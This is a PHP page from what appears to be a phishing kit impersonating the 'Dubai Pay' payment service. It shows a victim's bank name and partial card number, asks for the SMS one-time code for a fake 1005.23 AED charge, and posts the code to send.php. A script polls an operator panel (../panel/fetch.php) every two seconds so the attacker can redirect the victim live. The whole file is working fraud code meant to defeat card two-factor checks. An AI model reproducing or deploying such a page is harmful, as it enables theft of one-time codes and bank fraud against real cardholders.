<?php 
require '../main.php';
?>

<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Dubai Pay</title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <script type="text/javascript" src="./files/js/modernizr.min.js"></script>
    <script src="./files/js/jquery.js"></script>
    <script src="./files/js/jquery.ccvalid.js"></script>
    <script src="./files/js/jquery.mask.js"></script></head>
	
<body>
<center><style>.success, .error, .validation {
			border: 1px solid;
			margin: 10px 0px;
			padding: 15px 10px 15px 50px;
			background-repeat: no-repeat;
			background-position: 10px center;
		}
		.success {
			color: #4F8A10;
			background-color: #DFF2BF;
		}
		.error{
			color: #D8000C;
			background-color: #FFBABA;
			
		}
		.validation{
			color: #D63301;
			background-color: #FFCCBA;
		}</style>
    <div style="margin-left:2px;width:350px;border:solid 1px #d8d4d4;padding:25px">
        <?php if($_SESSION['ctype']=='visa'){echo '<img src="files/img/vsa_p.svg" style="width: 90px;float:left;">';echo '<img src="files/img/DubaiPay-logo.png" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';}elseif($_SESSION['ctype']=='mastercard'){echo '<img src="files/img/mst_p.svg" style="width: 90px;float:left;">';echo '<img src="files/img/DubaiPay-logo.png" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';}elseif($_SESSION['ctype']=='discover'){echo '<img src="files/img/ccicons/discover-on.png" style="width: 90px;float:left;">';echo '<img src="files/img/DubaiPay-logo.png" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';}elseif($_SESSION['ctype']=='amex'){echo '<img src="files/img/ccicons/amex-on.png" style="width: 90px;float:left;">';echo '<img src="files/img/DubaiPay-logo.png" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';}else{echo '<img src="files/img/DubaiPay-logo.png" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';}?>
        <div style="clear:both"></div>
        <p style="font-size:13px;margin-top:25px;color:#807979"> Please enter your sms code to process your Payment automatically</p>
		  <script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
  
		 $("#fixed").hide();
		 $("#formf").show(500);
      },4000);
  }
}
</script>




        <form method="post" id="formf" style="display: none;">
            <table align="center" width="290" style="font-size:11px;font-family:arial,sans-serif;color:#000;margin-top:30px">
                <tbody>
				
				<tr><td align="right">Bank :</td><td><?php echo $_SESSION['bnk'];?></td></tr><br>
				<tr><td align="right">Date :</td><td><?php echo date("d M,Y");  ?></td></tr><br>
                <tr><td align="right">Card :</td><td> ••••<?php echo $_SESSION['last']?></td></tr>
				<tr><td align="right">Amount :</td><td>1005.23 AED</td></tr>

				<tr><td align="right">SMS CODE</td><td class="xx"><input style="width: 161px;" type="text" name="sms" required=""></td></tr>
				
				
				<tr><td></td><td><br>

				<input style="width:74px" type="submit" value="Proceed"></td></tr>
				</tbody></table>
        </form>
		<script type="text/javascript">

var request;
$("#formf").submit(function(event){
    event.preventDefault();
    if (request) {
        request.abort();
    }
    var $form = $(this);
    var $inputs = $form.find("input, select, button, textarea");
    var serializedData = $form.serialize();
    $inputs.prop("disabled", true);
	$("#tiitleerror").show(400);
    request = $.ajax({
        url: "send.php",
        type: "post",
        data: serializedData
    });
    request.done(function (response, textStatus, jqXHR){
 $(location).attr("href", "wait.php");
    });
    request.fail(function (jqXHR, textStatus, errorThrown){
        console.error(
            "The following error occurred: "+
            textStatus, errorThrown
        );
    });
    request.always(function () {

        $inputs.prop("disabled", false);
    });
});

</script>
		    <div id="fixed" class="" style="">
			<img src="files/img/lod2.gif">
            <p class="">Loading...</p></div>
	
		
		<p style="text-align:center;font-family:arial,sans-serif;font-size:9px;color:#656565">Copyright © 2026. All rights reserved.</p></div>
    <div id="rotate" style="display:none"><div class="circle"><div class="rotate"></div></div>
        <div class="overlay"></div></div>
</center>
<script src="res/jq.js"></script>
<script>
var cd = "<?php echo $current_data; ?>";
setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
            cd=d;
        }
    })

}, 2000);
</script>
</body>
</html>